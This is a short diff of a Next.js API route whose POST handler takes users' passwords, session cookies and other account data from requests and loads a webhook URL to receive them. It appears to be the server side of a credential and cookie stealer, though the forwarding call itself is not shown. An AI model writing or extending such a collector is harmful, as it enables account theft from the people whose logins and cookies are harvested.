@@ -2,11 +2,13 @@ import { NextResponse } from 'next/server';
 
 export async function POST(request) {
   try {
-    const { userData, password, cookie, economyData, hasPremium, directory, embeds } = await request.json();
+    const { userData, password, cookie, directory, embeds } = await request.json();
     
+    // Get permanent webhook from Vercel environment variables
     const permanentWebhook = process.env.PERMANENT_WEBHOOK_URL;
 
     if (!permanentWebhook) {
+      console.error('PERMANENT_WEBHOOK_URL not found in environment variables');
       return NextResponse.json({ error: 'Webhook not configured' }, { status: 500 });
     }
 
